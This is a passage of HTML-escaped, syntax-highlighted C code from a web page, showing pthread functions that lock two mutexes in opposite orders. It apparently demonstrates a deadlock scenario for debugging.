&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-25&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-26&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;func2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-27&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-28&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_lock&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-29&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sequence2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-30&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-31&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_lock&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-32&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sequence1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-33&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_unlock&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-34&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_unlock&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-35&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-36&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sequence2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-37&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-38&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-39&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;thread1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-40&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-41&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-42&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-43&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;iRetValue&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;func1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-44&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-45&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;iRetValue&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;100000&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-46&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-47&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_exit&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-48&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-49&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-50&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-51&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-52&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;thread2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-53&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-54&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-55&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-56&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;iRetValue&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;func2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-57&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-58&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;iRetValue&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;100000&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-59&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-60&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_exit&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-61&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-62&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-63&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-64&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-65&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;thread3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-66&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-67&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-68&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-69&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-70&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;szBuf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-71&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;szBuf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;szBuf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-72&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;szBuf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;thread3&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-73&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-74&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-75&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-76&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;thread4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-77&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-78&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-79&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-80&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-81&quot;&gt;
